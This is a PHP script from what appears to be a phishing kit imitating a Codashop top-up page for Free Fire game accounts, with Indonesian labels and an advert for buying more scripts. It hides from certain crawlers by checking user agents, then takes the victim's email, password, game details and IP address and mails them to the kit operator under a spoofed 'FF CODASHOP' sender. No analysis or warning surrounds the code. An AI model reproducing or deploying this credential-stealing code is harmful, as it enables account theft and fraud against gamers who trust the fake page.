<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('http://idhaampedia.me/404.php');
die();
}
if(isset($_POST['loginData'])) {
    $prov   = $_POST['prov'];
    $email  = $_POST['user'];
    $pass   = $_POST['pass'];
    $nick   = $_POST['nick'];
    $level  = $_POST['level'];
    $ep     = $_POST['ep'];
    $device = $_POST['device'];
    $rank   = $_POST['rank'];

    $ipaddress = $_SERVER['REMOTE_ADDR'];

    if($ep != "" || $device != "" || $rank != "" || $level != "") {
        include"../email.php";
        $nickName = ucfirst($nick);
        $subject = "Akun FF Log $prov | $nickName";
        $body = <<<EOD
            <pre style='font-size: 1.1em;'>
            <table>
            <tr>
                <th colspan="3" align="left">AKUN FF FRESH SANGAD</th>
            </tr>
            <tr>
                <td>&nbsp;</td>
            </tr>
            <tr>
                <td>Email</td>
                <td>:</td>
                <td>$email</td>
            </tr>
            <tr>
                <td>Password</td>
                <td>:</td>
                <td>$pass</td>
            </tr>
            <tr>
                <td>&nbsp;</td>
            </tr>
            <tr>
                <th colspan="3" align="left">DETAIL AKUN</th>
            </tr>
            <tr>
                <td>Nickname</td>
                <td>:</td>
                <td>$nick</td>
            </tr>
            <tr>
                <td>Level</td>
                <td>:</td>
                <td>$lvl</td>
            </tr>
            <tr>
                <td>Rank</td>
                <td>:</td>
                <td>$rank</td>
            </tr>
            <tr>
                <td>EP Season</td>
                <td>:</td>
                <td>$ep</td>
            </tr>
            <tr>
                <td>Device</td>
                <td>:</td>
                <td>$device</td>
            </tr>
            <tr>
                <td>IP Address</td>
                <td>:</td>
                <td>$ipaddress</td>
            </tr>
            <tr>
                <td>&nbsp;</td>
            </tr>
            <tr>
                <th colspan="3" align="left">Terima Kasih</th>
            </tr>
            <tr>
                <td>&nbsp;</td>
            </tr>
            <tr>
                <th colspan="3" align="left">Beli Script keren? Chat Idhaam69 <a href="https://www.facebook.com/IdhamDotID">Disini</a>.</th>
            </tr>
            </table>
            </pre>
EOD;
        $headersx = 'MIME-Version: 1.0' . "\r\n"; 
        $headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n"; 
        $headersx .= 'From: FF CODASHOP <result@idhaam>' . "\r\n"; 
        $kirim    = mail($mailto, $subject, $body, $headersx);
        if($kirim) {
            session_start();
            $_SESSION['nick'] = $nick;
            header('location: success.php');
        }

    } else {

    }
}

?>